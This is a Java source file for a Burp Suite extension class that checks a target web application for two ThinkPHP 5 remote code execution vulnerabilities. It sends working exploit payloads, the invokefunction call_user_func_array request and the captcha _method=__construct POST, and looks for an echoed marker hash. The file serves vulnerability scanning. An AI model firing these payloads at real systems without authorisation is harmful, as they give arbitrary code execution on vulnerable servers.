package burp.Application;

import burp.*;

import java.io.PrintWriter;
import java.lang.reflect.Array;
import java.net.URL;
import java.util.Arrays;
import java.util.Collections;
import java.util.Iterator;
import java.util.List;

public class TPDetection {

    IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private IHttpRequestResponse baseRequestResponse;
    private IHttpRequestResponse newRequestResponse;
    private Boolean isVulExists = false;
    private String baseRequestDomainName;
    private String vulUrl;
    private PrintWriter stdout;


    public TPDetection(PrintWriter stdout, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, IHttpRequestResponse baseRequestResponse, String baseRequestDomainName){
        this.stdout = stdout;
        this.callbacks = callbacks;
        this.helpers = helpers;
        this.baseRequestResponse = baseRequestResponse;
        this.baseRequestDomainName = baseRequestDomainName;
        this.run();
    }

    public void run(){
        String[] pocArray = new String[]{"Tp5ControllerRce", "Tp5MethodRce"};
        int i = 0;
        do{
            getShell(pocArray[i]);
            ++i;
        }while (!isVulExists && i < pocArray.length);
    }

    public boolean IsVulExists(){
        return this.isVulExists;
    }

    public byte[] makeGetRequest(IHttpRequestResponse baseRequestResponse, String url){
        URL targetUrl = null;
        try{
            targetUrl = new URL(url);
        }catch (Exception e){
            stdout.println(e);
        }
        newRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), helpers.buildHttpRequest(targetUrl));
        return  newRequestResponse.getResponse();
    }

    public byte[] makePostRequest(IHttpRequestResponse baseRequestResponse, String url, String data){
        URL targetUrl = null;
        try{
            targetUrl = new URL(url);
        }catch (Exception e){
            stdout.println(e);
        }
        byte[] body = data.getBytes();
        byte[] newRequest = helpers.buildHttpRequest(targetUrl);
        List<String> headers = helpers.analyzeRequest(newRequest).getHeaders();
        Collections.replaceAll(headers, headers.get(0), ((String)headers.get(0)).replace("GET", "POST"));
        Iterator var2 = headers.iterator();
        while(var2.hasNext()) {
            String header = (String)var2.next();
            if (header.contains("Content-Type")) {
                headers.remove(header);
                break;
            }
        }
        String contentType = "Content-Type: application/x-www-form-urlencoded";
        headers.add(contentType);
        newRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), helpers.buildHttpMessage(headers, body));
        return  newRequestResponse.getResponse();
    }

    public IHttpRequestResponse getHttpRequestResponse(){
        return this.baseRequestResponse;
    }

    public String GetVulUrl(){
        return this.vulUrl;
    }

    public void getShell(String pocName){
        if(pocName.equals("Tp5ControllerRce")){
            Tp5ControllerRce();
        }else if(pocName.equals("Tp5MethodRce")){
            Tp5MethodRce();
        }
    }
    public void Tp5ControllerRce(){
        try{
            String url = baseRequestDomainName + "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=7a835ba0a9b4e430e8c8ec83f954b369";
            byte[] response = makeGetRequest(baseRequestResponse, url);
            int bodyOffset = helpers.analyzeResponse(response).getBodyOffset();
            byte[] requestBody = Arrays.copyOfRange(response, bodyOffset, response.length);
            String body = this.helpers.bytesToString(requestBody);
            if(body.contains("7a835ba0a9b4e430e8c8ec83f954b369")){
                this.isVulExists = true;
                this.vulUrl = url;
                baseRequestResponse = newRequestResponse;
            }
        }catch (Exception e){
            stdout.println(e);
        }
    }

    public void Tp5MethodRce(){
        try{
            String url = baseRequestDomainName + "/index.php?s=captcha";
            String data = "_method=__construct&filter[]=printf&method=GET&server[REQUEST_METHOD]=7a835ba0a9b4e430e8c8ec83f954b369&get[]=1";
            byte[] response = makePostRequest(baseRequestResponse, url, data);
            int bodyOffset = helpers.analyzeResponse(response).getBodyOffset();
            byte[] requestBody = Arrays.copyOfRange(response, bodyOffset, response.length);
            String body = this.helpers.bytesToString(requestBody);
            if(body.contains("7a835ba0a9b4e430e8c8ec83f954b369")){
                this.isVulExists = true;
                this.vulUrl = url;
                baseRequestResponse = newRequestResponse;
            }
        }catch (Exception e){
            stdout.println(e);
        }
    }
}
